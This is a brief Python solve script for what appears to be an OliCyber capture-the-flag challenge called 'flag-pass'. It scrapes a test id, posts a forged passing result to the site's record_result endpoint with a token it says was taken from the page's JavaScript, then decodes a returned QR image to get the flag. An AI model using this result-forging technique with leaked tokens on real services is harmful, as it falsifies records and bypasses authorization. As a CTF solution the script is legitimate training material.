import requests, base64, cv2, numpy
from bs4 import BeautifulSoup
from pyzbar.pyzbar import decode

token = "8218d355-38ff-4bc3-9336-adf7f1ba55be" # ottenuto con il file javascript
site = "http://flag-pass.challs.olicyber.it/"
r = requests.get(f"{site}test")
b = BeautifulSoup(r.text, "html.parser")
my_id = str(b.find_all("code")[0]).replace("<code>", "").replace("</code>", "").replace(" ", "")
requests.post(f"{site}record_result", json={"token":f"{token}", "test_id":f"{my_id}", "result":True})
r = requests.get(f"{site}pass?id={my_id}")
b = BeautifulSoup(r.text, "html.parser")
data = str(b.find_all("img")[0]).replace('<img src="data:image/png;base64,', "").replace("/>", "")
qr = open("flag.png", "wb").write(base64.b64decode(data))
my_qr = cv2.imread("flag.png")
print(str(decode(my_qr)[0]).split(","))